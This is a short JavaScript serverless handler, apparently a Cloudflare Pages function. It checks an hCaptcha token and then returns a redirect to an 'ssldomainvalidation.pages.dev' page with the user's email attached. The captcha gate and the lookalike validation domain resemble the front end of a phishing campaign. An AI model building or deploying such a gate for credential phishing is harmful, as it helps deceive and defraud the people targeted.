export async function onRequestPost(context) {
  const formData = await context.request.formData();
  const token = formData.get("h-captcha-response");
  const email = formData.get("email") || "unknown";

  if (!token) {
    return new Response("Missing hCaptcha token", { status: 400 });
  }

  const secret = context.env.HCAPTCHA_SECRET_KEY;

  const response = await fetch("https://hcaptcha.com/siteverify", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `response=${token}&secret=${secret}`
  });

  const result = await response.json();

  if (!result.success) {
    return new Response("CAPTCHA failed", { status: 403 });
  }

  const redirectUrl = `https://ssldomainvalidation.pages.dev?email=${encodeURIComponent(email)}`;
  return new Response(JSON.stringify({ redirectUrl }), {
    headers: { "Content-Type": "application/json" },
    status: 200,
  });
}
